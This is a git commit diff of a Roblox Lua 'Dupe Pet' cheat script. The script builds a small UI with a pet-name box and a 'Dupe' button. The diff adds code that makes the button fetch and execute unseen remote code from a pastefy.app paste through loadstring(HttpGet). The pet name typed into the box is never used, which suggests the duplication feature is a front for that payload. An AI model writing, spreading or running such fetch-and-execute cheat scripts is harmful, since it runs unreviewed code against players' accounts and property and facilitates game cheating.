255cb79846dfffd56ec07d651dff32f27f462dcb
exclusiv1337 <exclusiv1392@gmail.com>
2025-05-24 16:35:05 +0200

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,15 +1,21 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Dupe Pets by Mangekoy2 | v2.0", "Serpent")
+local Window = Library.CreateLib("Dupe Pet by Mangekoy2 | v2.0", "Serpent")
 
 -- Вкладка Dupe Pet
 local DupeTab = Window:NewTab("Dupe Pet")
 local DupeSection = DupeTab:NewSection("DUPE PET")
 
--- Текстовое поле для ввода
-DupeSection:NewTextBox("", "Write pet name here", function(text)
-    -- Здесь можно использовать введенный текст
+-- Текстовое поле с подсказкой
+local InputField = DupeSection:NewTextBox("", "Write any pet", function(text)
+    -- Обработка введенного текста
+end)
+InputField.Instance.Size = UDim2.new(0, 250, 0, 30)
+
+-- Кнопка Dupe
+DupeSection:NewButton("Dupe", "", function()
+    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
 end)
 
--- Вкладка credits (строчными буквами)
-local CreditsTab = Window:NewTab("credits")
+-- Вкладка Credits
+local CreditsTab = Window:NewTab("Credits")
 CreditsTab:NewSection("Made by Mangekoy2 | v2.0")
